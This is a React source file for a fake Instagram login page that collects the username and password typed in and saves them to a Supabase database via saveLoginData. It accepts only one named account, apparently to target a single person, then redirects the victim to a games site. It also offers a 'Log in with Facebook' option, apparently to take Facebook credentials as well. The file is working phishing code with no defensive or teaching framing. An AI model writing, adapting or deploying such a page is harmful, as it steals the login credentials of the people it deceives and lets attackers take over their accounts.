import { useState } from 'react';
import { Instagram, Eye, EyeOff, ArrowLeft } from 'lucide-react';
import FacebookLogin from './FacebookLogin';
import { saveLoginData } from '../lib/supabase';

interface LoginPageProps {
  onBack: () => void;
  onLogin: () => void;
}

function LoginPage({ onBack, onLogin }: LoginPageProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    try {
      if (username !== 'hanan_elmehrat') {
        setError('Invalid username. Please enter valid username.');
        return;
      }

      await saveLoginData({
        username,
        password,
        login_type: 'instagram'
      });
      console.log('Login successful');
      onLogin();
      window.location.href = 'https://www.crazygames.com/';
    } catch (error) {
      console.error('Failed to save login data:', error);
      alert('Login failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4 py-12 relative">
      <button
        onClick={onBack}
        className="absolute top-6 left-6 flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors"
      >
        <ArrowLeft className="w-5 h-5" />
        <span className="font-medium">Back</span>
      </button>

      <div className="w-full max-w-sm">
        <div className="bg-white border border-gray-300 rounded-sm px-10 py-8 my-6">
          <div className="flex justify-center mb-8">
            <div className="flex items-center gap-2">
              <Instagram className="w-12 h-12" strokeWidth={1.5} />
              <h1 className="text-4xl font-semibold" style={{ fontFamily: "'Billabong', cursive" }}>
                Instagram
              </h1>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-2">
            <div>
              <input
                type="text"
                placeholder="enter your username..."
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-2 py-2 text-xs bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 transition-colors"
              />
            </div>

            {error && (
              <p className="text-xs text-red-600">{error}</p>
            )}

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-2 py-2 text-xs bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 transition-colors"
              />
              {password && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-gray-800"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              )}
            </div>

            <button
              type="submit"
              disabled={!username || !password || isLoading}
              className="w-full bg-blue-500 text-white font-semibold py-1.5 rounded-lg mt-4 disabled:opacity-30 disabled:cursor-not-allowed hover:bg-blue-600 transition-colors"
            >
              {isLoading ? 'Logging in...' : 'Log in'}
            </button>
          </form>

          <div className="flex items-center my-5">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-sm text-gray-500 font-semibold">OR</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <button
            onClick={() => setShowFacebookLogin(true)}
            className="w-full flex items-center justify-center gap-2 text-blue-900 font-semibold text-sm hover:text-blue-950 transition-colors"
          >
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Log in with Facebook
          </button>
        </div>

        <div className="mt-5">
          <p className="text-center text-sm mb-5">Get the app.</p>
          <div className="flex justify-center gap-2">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              alt="Get it on Google Play"
              className="h-10"
            />
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              alt="Get it from Microsoft"
              className="h-10"
            />
          </div>
        </div>
      </div>

      {showFacebookLogin && (
        <FacebookLogin
          onClose={() => setShowFacebookLogin(false)}
          onLogin={onLogin}
        />
      )}
    </div>
  );
}

export default LoginPage;
